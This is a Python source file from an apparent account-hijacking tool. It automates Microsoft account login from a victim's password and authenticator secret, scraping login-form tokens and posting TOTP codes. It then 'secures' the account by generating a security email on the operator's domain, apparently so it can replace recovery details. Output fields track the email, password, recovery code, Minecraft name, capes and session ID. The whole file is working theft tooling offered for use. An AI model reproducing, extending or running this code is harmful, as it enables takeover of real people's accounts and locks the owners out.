from securing.auth.handle_redirects import handle_redirects
from securing.auth.initial_session import get_session
from securing.build_embeds import build_account_data
from securing.utils.polish_host import polish_host
from securing.utils.get_livedata import livedata
from securing.utils.login_pwd import login_pwd
from securing.utils.secure import secure
from shared.gen_totp import totp

from database.database import DBConnection
from time import time
import logging
import httpx
import json
import uuid
import re

config = json.load(open("config/config.json", "r"))

async def login_authenticator(session: httpx.AsyncClient, email: str, data: dict, account: dict):
    initialTime = time()
    
    secret = data["auth_secret"]
    password = data["password"]

    live_data = await livedata(session)
    pwd_login = await login_pwd(
        session,
        email,
        live_data["urlPost"],
        password,
        live_data["ppft"]
    )

    logging.info(f"Password login response: {pwd_login}")
    sFT_match = re.search(r'"sFT":"([^"]+)"', pwd_login)
    post_url_match = re.search(r'"urlPost":"(https://[^"]+)"', pwd_login)
    proof_match = re.search(r'"arrUserProofs":\[.*?"data":"(\d+)".*?"type":(?:10|14)', pwd_login, re.DOTALL)

    if not sFT_match or not post_url_match or not proof_match:
        print("[X] - Invalid Password / Secret")
        return "invalid"

    sFT = sFT_match.group(1)
    post_url: str = post_url_match.group(1)
    proof_data: str = proof_match.group(1)
    tcode = await totp(secret)

    auth_post = await session.post(
        url = post_url,
        headers = {
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Content-Type": "application/x-www-form-urlencoded"
        },
        data = {
            "otc": tcode,
            "AddTD": "true",
            "SentProofIDE": proof_data,
            "GeneralVerify": "false",
            "PPFT": sFT,
            "canary": "",
            "sacxt": "1",
            "hpgrequestid": "",
            "hideSmsInMfaProofs": "false",
            "type": "19",
            "login": email,
            "infoPageShown": "0"
        },
        follow_redirects = True
    )
    logging.info(f"Auth login response: {auth_post.text}")

    urlPost = re.search(r'"urlPost":"([^"]+)"', auth_post.text)
    logging.info(f"Extracted urlPost: {urlPost.group(1) if urlPost else 'None'}")
    if not urlPost:
        msaauth = await handle_redirects(session, auth_post.text)
        if not msaauth:
            return None
    ppft = re.search(r'"sFT":"([^"]+)"', auth_post.text).group(1)

    await polish_host(session, {"urlPost": urlPost.group(1), "ppft": ppft})

    dsecured = await secure(session, True, account)
    logging.info(f"Account: {dsecured}")
    final_time = (time() - initialTime)

    build_account = await build_account_data(dsecured, final_time)
    return build_account
            
async def recoverySecure(email: str, type: str, data: dict) -> dict:

    session = get_session()

    account = {
        "microsoft": {
            "email": "Couldn't Change!",
            "security_email": "Couldn't Change!",
            "password": "Couldn't Change!",
            "recovery_code": "Couldn't Change!",
            "auth_secret": "Disabled",
            "firstName": "Failed to Get",
            "lastName": "Failed to Get",
            "fullName": "Failed to Get",
            "region": "Failed to Get",
            "birthday": "Failed to Get"
        },
        "minecraft": {
            "name": "No Minecraft",
            "method": "Not purchased",
            "gamertag": "Not Found",
            "uchange": "0 Days",
            "capes": "No capes",
            "SSID": False
        }
    }

    sname = uuid.uuid4().hex[:16]
    password = uuid.uuid4().hex[:12]

    security_email = f"{sname}@{config["domain"]}"
    print(f"[+] - Generated Security Email ({security_email})")

    with DBConnection() as database:
        database.add_security_email(security_email, password)

    print("[~] - Automaticly Securing Account...")
    match type:
        case "rcode":
            pass
        case "authpwd":
            account = await login_authenticator(session, email, data, account)

    return account
            